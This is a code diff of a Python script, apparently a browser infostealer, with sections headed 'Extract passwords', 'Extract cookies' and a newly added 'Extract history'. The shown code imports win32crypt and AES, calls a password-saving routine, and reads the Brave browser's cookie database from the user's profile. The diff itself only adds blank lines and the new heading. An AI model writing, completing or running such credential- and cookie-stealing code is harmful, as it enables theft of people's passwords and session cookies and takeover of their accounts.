@@ -9,9 +9,11 @@ from Crypto.Cipher import AES
 import win32crypt
 import sys
 
+
 ##
 ##Extract passwords
 ##
+
 def delete_file(file):
     try:
         os.remove(file)
@@ -142,6 +144,7 @@ save_passwords(load_path("db"), load_path("dir"))
 ##
 ##Extract cookies
 ##
+
 def fetch_cookies(dir):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
@@ -167,3 +170,8 @@ def fetch_cookies(dir):
     #return cookies
 
 fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+
+##
+##Extract history
+##
+
